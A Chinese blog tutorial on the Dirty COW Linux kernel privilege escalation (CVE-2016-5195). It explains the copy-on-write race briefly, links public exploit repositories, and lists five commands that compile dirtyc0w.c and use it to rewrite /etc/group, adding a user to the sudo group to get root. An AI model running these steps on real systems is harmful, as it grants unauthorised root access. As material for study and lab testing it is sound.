# （CVE-2016-5195）脏牛本地提权 - 暮日温柔 - 博客园

> 原文：[`www.cnblogs.com/daiorz/p/12009613.html`](https://www.cnblogs.com/daiorz/p/12009613.html)

###### 简要分析

该漏洞具体为，get_user_page 内核函数在处理 Copy-on-Write(以下使用 COW 表示)的过程中，可能产出竞态条件造成 COW 过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改 su 或者 passwd 程序就可以达到 root 的目的。具体分析请查看官方分析。

###### 测试工具

官方放出的 EXP:[链接](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fdirtycow%2Fdirtycow.github.io)
提权为 root 权限的 EXP 一：[链接](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2FFireFart%2Fdirtycow)
提权为 root 权限的 EXP 二：[链接](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fgbonacini%2FCVE-2016-5195)

**漏洞利用**第一步：　　sudo adduser test1 添加新用户第二步：　　gcc -pthread dirtyc0w.c -o dirty -lcrypt 利用 gcc 编译 dirtycOw.c 文件第三步：　　切换到 test1，查看 test1 用户信息，可以看到 test1 用户没有 sudo 权限，执行 sudo su 命令提示不在该分组，无法执行 sudo 命令第四步：　　使用命令./dirty /etc/group “$(sed ‘/\(sudo*\)/ s/$/,test1/’ /etc/group)”执行 exp 修改/etc/group 文件中的 sudo 分组成员，将 test1 加入到其中第五步：先切换为 test 用户后，然后切换回来就可以看到 test1 用户已经拥有了 sudo 权限，执行 sudo su ，输入 test1 用户的密码后就可以切换到 root 权限，提权成功